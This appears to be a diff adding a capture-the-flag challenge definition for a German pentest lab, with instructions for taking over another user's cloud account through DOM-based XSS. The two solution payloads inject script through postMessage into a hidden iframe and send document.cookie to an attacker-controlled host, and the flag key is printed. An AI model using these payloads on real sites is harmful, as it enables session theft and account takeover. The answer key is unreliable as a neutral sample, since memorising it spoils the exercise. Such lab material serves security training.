@@ -1,0 +1,35 @@
+---
+:description: |
+ Verschaffe dir mittels Dom-based Cross-Site Scripting Zugang zum CloneCloud Account (http://clonecloud.#PENTESTLAB-DOMAIN#) eines anderen Users.
+ Nutze dazu eine Schwachstelle aus, die du in der Kommunikation zwischen dem Dashboard (http://dashboard.#PENTESTLAB-DOMAIN#) und der Cloud findest.
+
+ Hinweis: Es gibt neugierige User, die sich alle Homepages auf http://myhomepage.#PENTESTLAB-DOMAIN# anschauen.
+ Die Lösung steht in einer Datei in der Cloud.
+:category: "XSS"
+:name: "Steal the Session ID - Part 2"
+:value: 20
+:keys:
+  - "Diese Cloud hat keinen Virenschutz!"
+:students:
+  - http://myhomepage.#PENTESTLAB-DOMAIN#/admin
+:solutions:
+  - |
+    <h1>Attackers place</h1>
+    Thank you for your cooperation!
+    <iframe onload='attack()' style='border: none;width:0; height:0' src='http://clonecloud.example.org/view.cgi'></iframe>
+    <script>
+      var payload = 'document.write("<img src=\'http://myhomepage.#PENTESTLAB-DOMAIN#/attacker?cookie="+document.cookie+"\' />")';
+      function attack(){
+        $("iframe")[0].contentWindow.postMessage("'/><scri"+"pt>"+payload+"</scri"+"pt><div id='comment","*");
+      };
+    </script>
+  - |
+    <h1>Attackers place</h1>
+    Thank you for your cooperation!
+    <iframe onload='attack()' style='border: none;width:0; height:0' src='http://clonecloud.#PENTESTLAB-DOMAIN#/view.cgi'></iframe>
+    <script>
+      var payload = 'document.write("<img src=\'http://#ATTACKER-IP#:1337/"+document.cookie+"\' />")';
+      function attack(){
+        $("iframe")[0].contentWindow.postMessage("'/><scri"+"pt>"+payload+"</scri"+"pt><div id='comment","*");
+      };
+    </script>
